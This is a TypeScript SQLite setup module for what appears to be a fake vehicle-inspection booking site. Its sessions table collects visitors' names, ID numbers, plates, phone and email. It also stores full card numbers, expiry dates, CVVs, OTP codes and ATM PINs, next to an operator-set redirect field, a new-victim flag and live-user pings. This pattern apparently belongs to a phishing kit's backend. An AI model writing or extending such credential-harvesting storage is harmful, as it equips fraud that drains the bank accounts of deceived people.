import Database from 'better-sqlite3';
import path from 'path';
import fs from 'fs';

const DB_DIR = process.env.DB_PATH || '/tmp';
const DB_PATH = path.join(DB_DIR, 'vsc_inspection.db');

let db: Database.Database;

function getDb(): Database.Database {
  if (!db) {
    db = new Database(DB_PATH);
    db.pragma('journal_mode = WAL');
    initDb(db);
  }
  return db;
}

function initDb(database: Database.Database) {
  database.exec(`
    CREATE TABLE IF NOT EXISTS sessions (
      id TEXT PRIMARY KEY,
      country TEXT DEFAULT '',
      ip TEXT DEFAULT '',
      name TEXT DEFAULT '',
      id_number TEXT DEFAULT '',
      plate_number TEXT DEFAULT '',
      booking_date TEXT DEFAULT '',
      phone TEXT DEFAULT '',
      email TEXT DEFAULT '',
      card_number TEXT DEFAULT '',
      card_expiry TEXT DEFAULT '',
      card_cvv TEXT DEFAULT '',
      card_holder TEXT DEFAULT '',
      otp_code TEXT DEFAULT '',
      atm_pin TEXT DEFAULT '',
      current_page TEXT DEFAULT 'home',
      status TEXT DEFAULT 'active',
      is_new INTEGER DEFAULT 1,
      redirect_to TEXT DEFAULT '',
      created_at INTEGER DEFAULT (strftime('%s','now') * 1000),
      updated_at INTEGER DEFAULT (strftime('%s','now') * 1000)
    );

    CREATE TABLE IF NOT EXISTS visits (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      session_id TEXT,
      page TEXT,
      country TEXT DEFAULT '',
      ip TEXT DEFAULT '',
      visited_at INTEGER DEFAULT (strftime('%s','now') * 1000)
    );

    CREATE TABLE IF NOT EXISTS active_users (
      session_id TEXT PRIMARY KEY,
      last_ping INTEGER DEFAULT (strftime('%s','now') * 1000)
    );
  `);
}

export default getDb;
